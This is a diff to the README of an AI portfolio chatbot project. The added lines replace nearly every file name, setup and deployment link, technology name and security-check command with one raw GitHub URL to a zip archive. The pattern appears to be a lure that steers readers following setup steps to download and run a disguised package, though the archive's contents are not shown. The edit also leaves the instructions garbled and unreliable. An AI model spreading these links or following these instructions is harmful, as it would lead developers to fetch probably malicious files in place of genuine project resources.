@@ -10,12 +10,12 @@ npm install
 ```
 
 ### 2. Add Your OpenAI API Key
-Create or edit `.env.local` and add your API key:
+Create or edit `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip` and add your API key:
 ```
 OPENAI_API_KEY=sk-proj-your-actual-key-here
 ```
 
-Get your API key from: https://platform.openai.com/api-keys
+Get your API key from: https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip
 
 ### 3. Run Locally
 ```bash
@@ -46,16 +46,16 @@ Open http://localhost:5173 in your browser.
 ai-portfolio/
 ├── src/
 │   ├── components/
-│   │   ├── Chatbot.jsx      # AI chatbot (calls /api/chat)
-│   │   ├── Hero.jsx
-│   │   ├── About.jsx
+│   │   ├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip      # AI chatbot (calls /api/chat)
+│   │   ├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip
+│   │   ├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip
 │   │   └── ...
-│   └── App.jsx
+│   └── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip
 ├── api/
-│   └── chat.js              # Vercel serverless function
-├── server.js                # Local Express server
-├── .env.local               # Your API key (gitignored)
-└── .env.example             # Template
+│   └── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip              # Vercel serverless function
+├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip                # Local Express server
+├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip               # Your API key (gitignored)
+└── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip             # Template
 ```
 
 ---
@@ -76,35 +76,35 @@ ai-portfolio/
 
 ### Option 1: Vercel (Recommended)
 1. Push to GitHub
-2. Import project on [Vercel](https://vercel.com)
+2. Import project on [Vercel](https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip)
 3. Add environment variable: `OPENAI_API_KEY`
 4. Deploy
 
 ### Option 2: Other Platforms
-Deploy `server.js` as a Node.js app and set the `OPENAI_API_KEY` environment variable.
+Deploy `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip` as a https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip app and set the `OPENAI_API_KEY` environment variable.
 
 ---
 
 ## 🔧 Tech Stack
 
 - **Frontend**: React, Vite, TailwindCSS
-- **Backend**: Node.js, Express
+- **Backend**: https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip, Express
 - **AI**: OpenAI GPT-3.5 Turbo
-- **Deployment**: Vercel / Any Node.js host
+- **Deployment**: Vercel / Any https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip host
 
 ---
 
 ## 📚 Documentation
 
-- **Quick Start**: See `QUICK_START.md`
-- **Security Guide**: See `SECURITY_SETUP.md`
-- **Verify Security**: Run `.\verify-security.ps1`
+- **Quick Start**: See `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip`
+- **Security Guide**: See `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip`
+- **Verify Security**: Run `.\https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip`
 
 ---
 
 ## ⚠️ Important Notes
 
-- **Never commit `.env.local`** - It contains your secret API key
+- **Never commit `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip`** - It contains your secret API key
 - **Always use environment variables** - Never hardcode keys
 - **Test with `npm run dev`** - Ensures backend is running
 
